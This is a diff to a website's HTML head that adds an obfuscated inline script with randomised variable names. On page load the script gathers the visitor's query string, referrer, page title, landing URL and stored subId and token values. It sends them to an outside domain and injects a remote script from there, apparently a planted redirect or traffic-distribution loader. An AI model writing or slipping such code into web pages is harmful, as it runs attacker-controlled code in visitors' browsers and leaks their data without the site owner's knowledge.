@@ -15,7 +15,51 @@
     <link rel="stylesheet" href="assets/css/default.css">
     <link rel="stylesheet" href="assets/css/style.css">
     <link rel="stylesheet" href="assets/css/responsive.css">
-
+<script>
+    (function() {
+    var name = '_KNbK5jmzfkBJz9Lh';
+    if (!window._KNbK5jmzfkBJz9Lh) {
+        window._KNbK5jmzfkBJz9Lh = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://geckosaffron.today',
+        };
+    }
+    const _9mcFkyY8DhpdLdkD = localStorage.getItem('config');
+    if (typeof _9mcFkyY8DhpdLdkD !== 'undefined' && _9mcFkyY8DhpdLdkD !== null) {
+        var _BPZ9rLs3FdPff9cP = JSON.parse(_9mcFkyY8DhpdLdkD);
+        var _d1PxHhJjw9Bsqqt1 = Math.round(+new Date()/1000);
+        if (_BPZ9rLs3FdPff9cP.created_at + window._KNbK5jmzfkBJz9Lh.ttl < _d1PxHhJjw9Bsqqt1) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _xBPgLQ22zYdT68BF = localStorage.getItem('subId');
+    var _ddZJzV85Y9hDcDNn = localStorage.getItem('token');
+    var _qmZ1s86fbn5KC4S3 = '?return=js.client';
+        _qmZ1s86fbn5KC4S3 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _qmZ1s86fbn5KC4S3 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _qmZ1s86fbn5KC4S3 += '&default_keyword=' + encodeURIComponent(document.title);
+        _qmZ1s86fbn5KC4S3 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _qmZ1s86fbn5KC4S3 += '&name=' + encodeURIComponent(name);
+        _qmZ1s86fbn5KC4S3 += '&host=' + encodeURIComponent(window._KNbK5jmzfkBJz9Lh.R_PATH);
+    if (typeof _xBPgLQ22zYdT68BF !== 'undefined' && _xBPgLQ22zYdT68BF && window._KNbK5jmzfkBJz9Lh.unique) {
+        _qmZ1s86fbn5KC4S3 += '&sub_id=' + encodeURIComponent(_xBPgLQ22zYdT68BF);
+    }
+    if (typeof _ddZJzV85Y9hDcDNn !== 'undefined' && _ddZJzV85Y9hDcDNn && window._KNbK5jmzfkBJz9Lh.unique) {
+        _qmZ1s86fbn5KC4S3 += '&token=' + encodeURIComponent(_ddZJzV85Y9hDcDNn);
+    }
+    if ('' !== '') {
+        _qmZ1s86fbn5KC4S3 += '&bypass_cache=';
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._KNbK5jmzfkBJz9Lh.R_PATH + _qmZ1s86fbn5KC4S3;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <script>
         function dtime_nums(e, t) {
             var a = new Date();
